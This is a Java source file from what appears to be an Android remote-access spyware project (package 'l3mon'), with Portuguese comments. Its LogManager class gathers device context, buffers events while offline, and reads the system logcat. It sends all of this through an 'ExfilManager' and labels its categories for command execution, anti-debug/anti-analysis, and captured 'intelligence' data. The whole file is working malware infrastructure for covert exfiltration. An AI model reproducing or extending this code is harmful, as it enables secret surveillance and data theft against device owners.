package com.etechd.l3mon.managers;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.BatteryManager;
import android.util.Log;
import com.etechd.l3mon.MainService;
import com.etechd.l3mon.StringCrypto;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

public class LogManager {
    private static final String TAG = "LogManager";
    private static final String EVENT_LOG = "0xLO";
    
    // Níveis de Log Estruturados
    public static final String LEVEL_INFO = "INFO";
    public static final String LEVEL_WARN = "WARN";
    public static final String LEVEL_ERROR = "ERROR";
    public static final String LEVEL_CRITICAL = "CRITICAL";
    public static final String LEVEL_SECURITY = "SECURITY";

    // Categorias Estratégicas
    public static final String CAT_SYSTEM = "SYSTEM";       // Ciclo de vida, bateria, rede
    public static final String CAT_OPERATIONAL = "OP";    // Execução de comandos, IO
    public static final String CAT_SECURITY = "SEC";      // Anti-debug, permissões
    public static final String CAT_INTELLIGENCE = "INTEL"; // Dados capturados, ATS

    private static final List<JSONObject> logBuffer = new ArrayList<>();

    /**
     * Log Estruturado com Contexto Automático
     */
    public static void log(String category, String level, String module, String message, JSONObject context) {
        try {
            JSONObject logObj = new JSONObject();
            logObj.put("cat", category);
            logObj.put("lvl", level);
            logObj.put("mod", module);
            logObj.put("msg", message);
            logObj.put("ts", System.currentTimeMillis());
            
            // Metadados Estratégicos (Estado do Dispositivo)
            logObj.put("ctx", getDeviceContext(context));

            if (isNetworkAvailable()) {
                sendBuffer();
                ExfilManager.sendFragmented(EVENT_LOG, logObj.toString());
            } else {
                bufferLog(logObj);
            }
        } catch (Exception e) {
            Log.e(TAG, "Fail to log: " + e.getMessage());
        }
    }

    private static JSONObject getDeviceContext(JSONObject customCtx) throws Exception {
        JSONObject ctx = customCtx != null ? customCtx : new JSONObject();
        Context androidCtx = MainService.getContextOfApplication();
        if (androidCtx != null) {
            // Bateria
            Intent batteryIntent = androidCtx.registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (batteryIntent != null) {
                int level = batteryIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                ctx.put("bat", (int)((level / (float)scale) * 100));
            }
            // Rede
            ConnectivityManager cm = (ConnectivityManager) androidCtx.getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
            ctx.put("net", activeNetwork != null ? activeNetwork.getTypeName() : "OFFLINE");
        }
        return ctx;
    }

    private static synchronized void bufferLog(JSONObject log) {
        if (logBuffer.size() < 100) { // Limite do buffer
            logBuffer.add(log);
        }
    }

    private static synchronized void sendBuffer() {
        if (logBuffer.isEmpty()) return;
        for (JSONObject log : new ArrayList<>(logBuffer)) {
            ExfilManager.sendFragmented(EVENT_LOG, log.toString());
        }
        logBuffer.clear();
    }

    private static boolean isNetworkAvailable() {
        Context ctx = MainService.getContextOfApplication();
        if (ctx == null) return false;
        ConnectivityManager cm = (ConnectivityManager) ctx.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo net = cm.getActiveNetworkInfo();
        return net != null && net.isConnected();
    }

    public static void logInternal(String level, String message) {
        log(CAT_SYSTEM, level, "INTERNAL", message, null);
    }
    
    public static void logSecurityEvent(String event) {
        log(CAT_SECURITY, LEVEL_SECURITY, "ANTI-ANALYSIS", event, null);
    }

    /**
     * Captura os últimos logs do sistema (Logcat) relacionados a tags específicas ou ao app
     * @param lineCount Número de linhas para capturar
     */
    public static void captureLogcat(int lineCount) {
        new Thread(() -> {
            try {
                // Comando para ler o logcat
                Process process = Runtime.getRuntime().exec("logcat -d -t " + lineCount + " *:E");
                BufferedReader bufferedReader = new BufferedReader(
                        new InputStreamReader(process.getInputStream()));

                StringBuilder logcat = new StringBuilder();
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    logcat.append(line).append("\n");
                }

                if (logcat.length() > 0) {
                    JSONObject logObj = new JSONObject();
                    logObj.put("type", "logcat");
                    logObj.put("data", logcat.toString());
                    logObj.put("ts", System.currentTimeMillis());

                    ExfilManager.sendFragmented(EVENT_LOG, logObj.toString());
                }
            } catch (Exception e) {
                Log.e(TAG, "Erro ao capturar logcat: " + e.getMessage());
            }
        }).start();
    }
}